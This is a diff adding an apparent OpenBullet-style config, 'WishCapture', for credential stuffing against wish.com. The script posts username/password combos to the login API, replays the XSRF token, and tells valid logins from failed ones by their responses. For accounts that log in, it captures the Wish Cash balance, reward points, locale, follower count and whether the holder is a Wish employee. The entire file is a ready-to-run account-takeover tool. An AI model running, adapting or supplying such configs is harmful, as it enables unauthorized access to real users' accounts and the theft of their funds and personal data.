@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "WishCapture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-18T22:51:07.1228444+02:00",
+  "AdditionalInfo": "",
+  "Author": "Edit",
+  "Version": "1.2.3.9 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#HvH.site REQUEST GET "https://www.wish.com/api/email-login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "host: www.wish.com" 
+
+#HvH.site PARSE "<COOKIES(_xsrf)>" LR "" "" -> VAR "xrsf" 
+
+#HvH.site REQUEST POST "https://www.wish.com/api/email-login" 
+  CONTENT "email=<USER>&password=<PASS>&_buckets=&_experiments=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "host: www.wish.com" 
+  HEADER "X-XSRFToken: <xrsf>" 
+
+#HvH.site KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"msg\": \"Email or Password is incorrect\", \"code\": 10, \"data\": {}" 
+  KEYCHAIN Success OR 
+    KEY "{\"msg\": \"\", \"code\": 0, \"data\": {\"signup_flow_pages\": [], \"session_token\": \"" 
+
+#HvH.site REQUEST GET "https://www.wish.com/cash" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#HvH.site PARSE "<SOURCE>" LR "\"wish_cash_balance\": \"" "\"," -> VAR "Balance2" 
+
+#HvH.site PARSE "<SOURCE>" LR "\"locale\": \"" "\"," -> CAP "Locale" 
+
+#HvH.site PARSE "<SOURCE>" LR "\"is_wish_employee\": " "," -> CAP "Employee" 
+
+#HvH.site REQUEST GET "https://www.wish.com/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#HvH.site PARSE "<SOURCE>" LR "num_followers\": " "," -> CAP "Followers" 
+
+#HvH.site REQUEST POST "https://www.wish.com/api/redeemable-rewards/get-rewards" 
+  CONTENT "offset=0&count=0&reward_type=0&get_dashboard_info=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-xsrftoken: <xrsf>" 
+
+#HvH.site PARSE "<SOURCE>" LR "\"total_points_text\": \"" "\"}," -> CAP "Points" 
+
+#HvH.site REQUEST POST "https://www.wish.com/api/daily-login/stamp-summary" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-xsrftoken: <xrsf>" 
+
+#HvH.site PARSE "<SOURCE>" LR "\"stamp_number\":" "}," -> CAP "Daily stamps" 
+
+#HvH.site FUNCTION Replace "\\u00a0" "" "<Balance2>" -> CAP "Balance" 
+
